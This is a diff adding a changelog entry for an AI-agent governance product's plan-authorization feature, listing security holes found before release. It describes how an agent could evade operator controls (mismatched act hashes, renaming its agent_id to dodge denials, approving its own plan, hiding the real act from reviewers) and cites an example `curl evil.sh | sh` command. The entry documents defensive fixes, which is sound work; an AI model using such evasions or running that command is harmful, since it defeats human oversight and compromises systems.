@@ -12,6 +12,52 @@ digests are compiled from these entries and posted by a human.
 
 Entries are newest-first.
 
+## 2026-07-26 — v5.4.0: preflight plans — the forward bet starts shipping
+
+With the roadmap's last obligations discharged this morning, the thesis's
+forward direction (governed autonomy) got its first feature the same day:
+**Preflight Plan Authorization**, built end to end from the 2026-07-06 RFC.
+An agent submits its intended plan before executing; every step dry-runs
+through the real guard pipeline with zero side effects; the operator
+reviews one card — per-step verdicts, expandable acts, disclosure of
+exactly what each grant will cover — and approved steps become single-use
+act-bound grants the run draws down without waking anyone. Denied steps
+hard-block org-wide for the plan's TTL. N mid-run interruptions become one
+upfront review with more context, not less.
+
+The build ran as twelve subagent-implemented tasks with per-task review,
+an Opus whole-branch review, and then the part worth writing down: **the
+pre-ship sweep said NO-GO seven times before it said GO**, and every
+blocker was real. In order: act-hash mismatch made denials evadable (the
+SDK scrubs acts before guarding, so submit and execute hashed different
+bytes); denials keyed on self-asserted agent_id (rename yourself, resume);
+no separation of duties (the submitting credential could approve its own
+plan — migration 0063 added created_by); omitting an optional field
+skipped the deny check entirely; the review card never showed the act (an
+operator approving "run the test suite" could be binding `curl evil.sh |
+sh`); a submitter could self-deny to plant org-wide blocks, or revoke its
+own denied plan to lift the operator's no; and the SoD gate no-op'd on
+principal-less auth channels. Each hole got a fix, a regression test, and
+where it mattered, a live re-proof — the policy-smoke AF section now
+proves submit → approve → grant consumption → single-use exhaustion →
+act-bound hit AND miss → revoke, against a running instance. The drift
+audit meanwhile caught count rot in places the gated checker never looked
+(a /docs table claiming 17 tools while rendering 15; pre-cull figures in
+the platform guide), so the checker itself got widened — that class is now
+mechanical.
+
+An honest accounting of what this cost: eight sweep iterations of three
+agents each, on top of the build. On a product whose brand is provable
+enforcement, the grant machinery — the first code that ever DOWNGRADES a
+decision — is exactly where that spend belongs. Residuals are recorded,
+not hidden: the pending-cap race under concurrency, the deny-lift SQL
+precondition, derived 'expired' status, a deny-hash index, and the
+deliberately-accepted boundaries (480-minute TTL per the THESIS amendment,
+org-wide denial binding, the key-model SoD limit shared with /api/approvals)
+are all in the ship notes with reasons. Wes's tail: `npm run release:sdks`
+and `npm run release:mcp` — the SDKs and MCP server both carry new surface
+this time, so both publishes are genuinely owed.
+
 ## 2026-07-26 — the reads fire: activation on the old door, and the era exits with a baseline
 
 The two dated obligations that outlived the cull came due while the repo
